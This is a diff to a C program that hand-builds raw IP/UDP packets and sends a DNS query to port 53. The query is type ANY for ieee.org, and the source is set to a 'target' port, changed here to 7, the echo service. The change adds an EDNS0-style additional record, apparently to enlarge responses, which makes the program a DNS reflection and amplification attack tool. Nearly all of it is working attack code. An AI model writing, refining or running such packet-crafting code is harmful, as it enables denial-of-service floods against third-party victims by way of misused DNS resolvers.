@@ -9,11 +9,12 @@
 #include <arpa/inet.h>
 
 #define DATA_SIZE 200
-#define TARGET_PORT 10
+#define TARGET_PORT 7
 #define DNS_PORT 53
 
-const unsigned char DNS_Q[] = "\4ieee\3org\0";//"\3isc\3org\0";//\4ieee\3org\0";//"";//"";//"\3www\6google\3com\0";
+const unsigned char DNS_Q[] = "\4ieee\3org\0";//"\3isc\3org\0";//\4ieee\3org\0";//"\3www\6google\3com\0";
 const unsigned DNS_Q_Len = sizeof(DNS_Q);
+const unsigned add_info[] = {0x10290000, 0, 0xC0000, 0x5608000a, 0xF0613668, 0x3BDCF6}; //23 byte
 
 struct dns_t
 {
@@ -34,7 +35,7 @@ int main(int argc, char **argv)
 	IP->ip_v = 4;
 	IP->ip_hl = 5;
 	IP->ip_tos = 0;
-	IP->ip_len = 44 + DNS_Q_Len - 1;
+	IP->ip_len = 44 + DNS_Q_Len - 1 + 23;
 	IP->ip_id = htons(618);
 	IP->ip_off = 0;
 	IP->ip_ttl = 255;
@@ -44,20 +45,21 @@ int main(int argc, char **argv)
 
 	UDP->source = htons(TARGET_PORT);
 	UDP->dest = htons(DNS_PORT);
-	UDP->len = htons(24 + DNS_Q_Len - 1);
-	UDP->check = 0;
+	UDP->len = htons(24 + DNS_Q_Len - 1 + 23);
 
 
 	DNS->id = htons(getpid());
-	DNS->flag = htons(0x0100);
-	DNS->que_count = htons(1);
-	DNS->ans_count = DNS->ser_count = DNS->add_count = 0;
+	DNS->flag = htons(0x0120);
+	DNS->que_count = DNS->add_count = htons(1);
+	DNS->ans_count = DNS->ser_count = 0;
 
 	memcpy(query, DNS_Q, DNS_Q_Len);
 	query += DNS_Q_Len - 1;
 	*(short *) query = htons(0x00FF);
 	query += 2;
 	*(short *) query = htons(0x0001);
+	query += 2;
+	memcpy(query, add_info, sizeof(add_info));
 
 	struct sockaddr_in sin;
     sin.sin_family = AF_INET;
@@ -68,7 +70,7 @@ int main(int argc, char **argv)
 	socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); //create socket
 	if(socket_fd == -1) error_msg("socket failed.");
 	if(setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, &val, 4) == -1) error_msg("set socket failed.");
-	if(sendto(socket_fd, data, 44 + DNS_Q_Len - 1, 0, (struct sockaddr *)&sin, sizeof(sin)) == -1) error_msg ("send function failed.");
+	if(sendto(socket_fd, data, 44 + DNS_Q_Len - 1 + 23, 0, (struct sockaddr *)&sin, sizeof(sin)) == -1) error_msg ("send function failed.");
 	close(socket_fd);
 
 	return 0;
